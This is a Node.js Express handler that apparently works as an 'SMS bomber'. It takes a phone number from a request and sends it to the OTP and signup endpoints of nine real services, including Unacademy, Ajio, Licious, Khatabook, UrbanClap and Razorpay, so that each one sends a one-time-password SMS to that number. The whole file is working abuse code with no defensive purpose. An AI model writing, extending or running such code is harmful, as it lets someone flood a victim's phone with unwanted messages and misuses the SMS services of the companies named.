const axios = require("axios");

const first = async (req, res) => {
  const mobile = req.body.mobile;

  try {
    await callApi1(mobile);
    await callApi2(mobile);
    await callApi3(mobile);
    await callApi4(mobile);
    await callApi5(mobile);
    await callApi6(mobile);
    await callApi7(mobile);
    await callApi8(mobile);
    await callApi9(mobile);

    return res.status(200).send(`Hi ${req.body.mobile}`);
  } catch (error) {
    console.error(error);
    return res.status(400).send("Kuch Dikkat hogai");
  }
};

const callApi1 = async (mobile) => {
  try {
    const apiUrl = 'https://unacademy.com/api/v3/user/user_check/?enable-email=true';
    const requestData = {
      country_code: "IN",
      email: "",
      is_un_teach_user: false,
      otp_type: 1,
      phone: mobile,
      send_otp: true
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 1 Error:", error.message);
  }
};

const callApi2 = async (mobile) => {
  try {
    const apiUrl = "https://login.web.ajio.com/api/auth/signupSendOTP";
    const requestData = {
      "firstName": "DD",
      "genderType": "Male",
      "login": "q2213244@gmail.com",
      "mobileNumber": mobile,
      "newDesign": false,
      "requestType": "SENDOTP"
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 2 Error:", error.message);
  }
};

const callApi3 = async (mobile) => {
  try {
    const apiUrl = `https://web.pocketfm.com/send_otp/?phone_number=%2B91${mobile}&country_code=%2B91`;
    const requestData = {
      device_id: "-2096972671",
      locale: "IN",
      platform: "web",
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 3 Error:", error.message);
  }
};

const callApi4 = async (mobile) => {
  try {
    const apiUrl = "https://www.licious.in/api/login/signup";
    const requestData = {
      captcha_token: null,
      phone: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 4 Error:", error.message);
  }
};

const callApi5 = async (mobile) => {
  try {
    const apiUrl = "https://api.khatabook.com/v1/auth/request-otp";
    const requestData = {
      app_signature: "Jc/Zu7qNqQ2",
      country_code: "+91",
      phone: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 5 Error:", error.message);
  }
};

const callApi6 = async (mobile) => {
  try {
    const apiUrl = "https://dashboard.happylocate.com/api/v1/user/register/send-otp";
    const requestData = {
      mobile: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 6 Error:", error.message);
  }
};

const callApi7 = async (mobile) => {
  try {
    const apiUrl = "https://www.urbanclap.com/api/v2/growth/profile/generateOTPv2";
    const requestData = {
        "city_key": null,
        "countryId": "IND",
        "customer": {
            "phone": {
            "isd_code": "+91",
            "phone_wo_isd": mobile
            }
        },
        "resend": false,
        "source": "phone"
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 7 Error:", error.message);
  }
};

const callApi8 = async (mobile) => {
  try {
    const apiUrl = "https://production.apna.co/api/userprofile/v1/otp/";
    const requestData = {
        "hash_type": "original",
        "phone_number": mobile,
        "request_id": "1709108042942",
        "retries": 1
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 8 Error:", error.message);
  }
};

const callApi9 = async (mobile) => {
  try {
    const apiUrl = "https://dashboard.razorpay.com/user/signin/otp";
    const requestData = {
        "contact_mobile" : mobile
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 9 Error:", error.message);
  }
}; 


  

module.exports = { first, callApi1, callApi2, callApi3, callApi4, callApi5, callApi6 };